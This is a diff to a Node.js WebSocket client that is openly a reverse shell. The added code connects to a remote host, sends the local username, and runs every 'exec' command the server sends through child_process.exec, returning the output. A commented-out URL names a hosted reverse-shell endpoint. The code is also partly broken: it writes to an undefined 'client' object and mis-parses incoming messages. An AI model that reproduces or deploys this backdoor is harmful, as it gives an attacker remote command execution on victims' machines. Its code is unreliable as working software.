@@ -1,25 +1,45 @@
+const { exec } = require('child_process');
 var WebSocket = require('ws');
-//var ws = new WebSocket('wss://192.168.0.240:8080');
-var ws = new WebSocket('wss://reverseshell-ondrejdostal007.b4a.run/');
+var ws = new WebSocket('ws://192.168.0.240:8080');
+//var ws = new WebSocket('wss://reverseshell-ondrejdostal007.b4a.run/');
 ws.on('open', () => {
-    console.log("Websocket connection opened.")
-    ws.emit("message", "test")
+    console.log("> Websocket connection opened.")
+    ws.send(JSON.stringify({ type: "id", value: require("os").userInfo().username }))
 });
-ws.on('message', function(data, flags) {
-  console.log(data.toString())
-    // flags.binary will be set if a binary data is received
-    // flags.masked will be set if the data was masked
+ws.on('message', function(msg) {
+  msg = JSON.parse(msg.data)
+  console.log("Server >", msg.value)
+  switch(msg.type){
+    case "msg":
+      console.log(">", msg)
+      break;
+    case "exec":
+      exec(msg.value, (error, stdout, stderr) => {
+        console.log('> Transmitting output..');
+        if (error) {
+            console.log('ERROR');
+            return client.write(error.message)
+        }
+        if (stderr) {
+            console.log('ERROR');
+            return client.write(stderr)
+        }
+        console.log('> Transmission successfull');
+        return client.write(stdout)
+      })
+      break;
+  }
 });
 
 ws.on("upgrade", (data) => {
-  console.log("Protocol upgraded from HTTP to WSS.", data.statusCode)
+  console.log("> Protocol upgraded from HTTP to WSS.", data.statusCode)
 })
 ws.on("close", (data) => {
-  console.log("Connection closed.", data)
+  console.log("> Connection closed.", data)
 })
 //ws.ping()
 ws.on("error", (err) => {
-  console.log(err)
+  console.log("ERROR", err)
 })
 
 /*const net = require('net');
